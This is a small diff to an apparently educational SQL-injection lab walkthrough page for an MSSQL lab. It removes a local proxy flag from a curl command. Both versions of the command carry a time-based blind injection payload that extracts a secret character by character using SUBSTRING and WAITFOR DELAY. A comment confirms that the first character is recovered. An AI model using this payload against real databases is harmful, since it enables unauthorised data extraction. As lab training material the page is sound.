@@ -153,7 +153,7 @@ print(f'Flag: {flag}')<br>
         <span class="terminal-title">curl. Manual Timing Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab5" \<br> --data-urlencode "search='; IF (ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),1,1))=70) WAITFOR DELAY '0:0:2' -- -"<br><br>
+        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/mssql/lab5" \<br> --data-urlencode "search='; IF (ASCII(SUBSTRING((SELECT TOP 1 secret FROM secrets),1,1))=70) WAITFOR DELAY '0:0:2' -- -"<br><br>
         <span class="prompt"># </span>Verified: Returns "Search complete." with Time: 2.022s -- first char is 'F' (ASCII 70)
     </div>
 </div>
